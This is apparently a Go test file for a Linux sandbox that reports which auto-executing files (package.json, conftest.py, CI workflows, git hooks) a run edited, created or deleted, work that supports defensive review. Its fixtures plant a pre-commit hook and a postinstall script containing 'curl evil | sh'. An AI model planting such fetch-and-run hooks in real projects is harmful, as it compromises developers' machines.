//go:build linux

package linux

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"testing"
	"time"

	"github.com/whiskeyjimbo/bento/enforce"
	"github.com/whiskeyjimbo/bento/policy"
)

// The report exists to point a reviewer at the auto-executing files a run touched, so
// every way a run can touch one has to reach the list: an edit, a create, and a delete.
// A snapshot that only recorded what existed before would miss the last two, which are
// the shapes that plant and unplant a hook.
func TestChangedAutoExecNamesEveryKindOfChange(t *testing.T) {
	grant := t.TempDir()
	write := func(rel, body string) string {
		p := filepath.Join(grant, rel)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
		return p
	}
	edited := write("package.json", `{"scripts":{}}`)
	removed := write("conftest.py", "import pytest\n")
	untouched := write("build.rs", "fn main() {}\n")
	workflow := write(".github/workflows/ci.yml", "on: push\n")

	before := snapshotAutoExec([]string{grant})

	// A same-size rewrite is invisible to a size compare alone, so the edit keeps the
	// length and moves only the mtime - the half of the stamp a test writing a longer
	// string would never exercise.
	if err := os.WriteFile(edited, []byte(`{"scripts":{"postinstall":"x"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Chtimes(workflow, time.Time{}, time.Now().Add(time.Second)); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(removed); err != nil {
		t.Fatal(err)
	}
	created := write(".husky/pre-commit", "#!/bin/sh\ncurl evil | sh\n")

	got := changedAutoExec(before, snapshotAutoExec([]string{grant}))
	want := []string{created, edited, removed, workflow}
	slices.Sort(want)
	if !slices.Equal(got, want) {
		t.Errorf("changed = %v, want %v", got, want)
	}
	if slices.Contains(got, untouched) {
		t.Errorf("%s was not changed but is reported", untouched)
	}
}

// The blind spots are deliberate and documented on enforce.Result.ChangedAutoExec, so
// they are pinned: a widening that closes one should be a decision someone made, and a
// narrowing that opens a new one should fail here rather than silently drop a hint.
func TestChangedAutoExecScopeIsGrantRootAndTheNamedDirs(t *testing.T) {
	grant := t.TempDir()
	nested := filepath.Join(grant, "packages", "web")
	if err := os.MkdirAll(nested, 0o755); err != nil {
		t.Fatal(err)
	}
	before := snapshotAutoExec([]string{grant})
	if err := os.WriteFile(filepath.Join(nested, "package.json"), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := changedAutoExec(before, snapshotAutoExec([]string{grant})); len(got) != 0 {
		t.Errorf("a nested package.json is out of scope by construction, got %v", got)
	}

	// A grant that is a plain file, or names nothing on this host, must not panic or
	// invent a change - resolveGrants admits both shapes.
	missing := filepath.Join(grant, "not-there")
	file := filepath.Join(grant, "setup.py")
	if err := os.WriteFile(file, []byte("x"), 0o644); err != nil {
		t.Fatal(err)
	}
	before = snapshotAutoExec([]string{missing, file})
	if got := changedAutoExec(before, snapshotAutoExec([]string{missing, file})); len(got) != 0 {
		t.Errorf("an unchanged run reported %v", got)
	}
}

// The snapshot is only worth anything if a real run carries it into the Result, and the
// two halves are wired separately - the baseline before the target starts, the compare
// after it exits. A unit test of changedAutoExec passes with either end unhooked.
func TestRunReportsTheAutoExecFilesTheTargetChanged(t *testing.T) {
	requireSandbox(t)

	dir := t.TempDir()
	touched := filepath.Join(dir, "package.json")
	if err := os.WriteFile(touched, []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}
	left := filepath.Join(dir, "conftest.py")
	if err := os.WriteFile(left, []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	script := filepath.Join(dir, "p.sh")
	if err := os.WriteFile(script, []byte(`echo '{"scripts":{"postinstall":"curl evil | sh"}}' > `+touched+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	p := &policy.Policy{Entrypoint: script, Interpreter: "sh", Write: []string{dir}, Exec: policy.ExecAll}

	res, err := sandboxEnforcer(t).Run(context.Background(), p, enforce.Process{}, enforce.RunOptions{})
	if err != nil {
		t.Fatalf("Run: %v", err)
	}
	if !slices.Contains(res.ChangedAutoExec, touched) {
		t.Errorf("the run rewrote %s but the result does not report it; ChangedAutoExec=%v", touched, res.ChangedAutoExec)
	}
	if slices.Contains(res.ChangedAutoExec, left) {
		t.Errorf("%s was untouched but is reported; ChangedAutoExec=%v", left, res.ChangedAutoExec)
	}
}
